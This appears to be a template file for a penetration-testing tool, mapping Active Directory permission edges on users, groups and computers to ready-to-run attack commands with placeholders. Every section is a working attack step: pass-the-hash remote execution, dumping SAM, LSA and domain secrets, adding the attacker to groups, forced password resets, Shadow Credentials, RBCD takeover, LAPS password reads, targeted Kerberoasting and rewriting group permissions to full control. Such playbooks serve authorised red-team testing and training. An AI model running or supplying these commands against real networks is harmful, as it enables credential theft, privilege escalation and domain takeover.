adminto.default_command:
# Run as {from} on {to}
impacket-psexec {DOMAIN}/{USERNAME}@{toShort} -hashes :{NTLM_HASH}
netexec smb {toShort} -u {USERNAME} -H {NTLM_HASH} --sam --lsa
impacket-secretsdump {DOMAIN}/{USERNAME}@{toShort} -hashes :{NTLM_HASH}

group.command:
# Add yourself to {to}, then you inherit its rights
net rpc group addmem "{toShort}" "{USERNAME}" -U "{DOMAIN}"/"{USERNAME}"%"{PASSWORD}" -S {DC_IP}
# PowerView
Add-DomainGroupMember -Identity "{toShort}" -Members {USERNAME}

user.command:
# Reset the password
net rpc password "{toShort}" "NewP@ss123!" -U "{DOMAIN}"/"{USERNAME}"%"{PASSWORD}" -S {DC_IP}
# OR Shadow Credentials (stealthier, no pw change)
certipy shadow auto -u {USERNAME}@{DOMAIN} -p {PASSWORD} -account {toShort}

computer.command:
# Shadow Credentials → auth as the machine
certipy shadow auto -u {USERNAME}@{DOMAIN} -p {PASSWORD} -account {toShort}
# OR RBCD takeover
impacket-rbcd -delegate-from 'FAKE$' -delegate-to '{toShort}' -action write {DOMAIN}/{USERNAME}:{PASSWORD}
# OR read its LAPS password
netexec ldap {DC_IP} -u {USERNAME} -p {PASSWORD} -M laps

group.command:
# GenericWrite lets you edit the "member" attribute → add yourself
net rpc group addmem "{toShort}" "{USERNAME}" -U "{DOMAIN}"/"{USERNAME}"%"{PASSWORD}" -S {DC_IP}
# PowerView
Add-DomainGroupMember -Identity "{toShort}" -Members {USERNAME}

user.command:
# Targeted Kerberoast — set a fake SPN, roast, then clear it
Set-DomainObject -Identity {toShort} -Set @{serviceprincipalname='fake/svc'}
impacket-GetUserSPNs {DOMAIN}/{USERNAME}:{PASSWORD} -request-user {toShort}
# OR Shadow Credentials
python3 pywhisker.py -d {DOMAIN} -u {USERNAME} -p {PASSWORD} --target {toShort} --action add

group.command:
# 1. Grant yourself full control over the group
impacket-dacledit -action write -rights FullControl -principal {USERNAME} -target "{toShort}" {DOMAIN}/{USERNAME}:{PASSWORD}
# 2. Now add yourself to it
net rpc group addmem "{toShort}" "{USERNAME}" -U "{DOMAIN}"/"{USERNAME}"%"{PASSWORD}" -S {DC_IP}

